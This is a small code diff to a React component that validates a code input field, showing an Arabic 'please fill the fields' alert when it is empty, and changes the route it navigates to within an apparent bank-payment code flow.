@@ -15,7 +15,7 @@ const Code = () => {
     if(code.current.value == ""){
       alert('من فضلك قم بملى الحقول')
     }else{
-      router.push(`/fozajil/banks/pay/code/nphad?names=${datas}`)
+      router.push(`/fozajil/banks/pay/code/nphad/codeto?names=${datas}`)
     }
   }
 
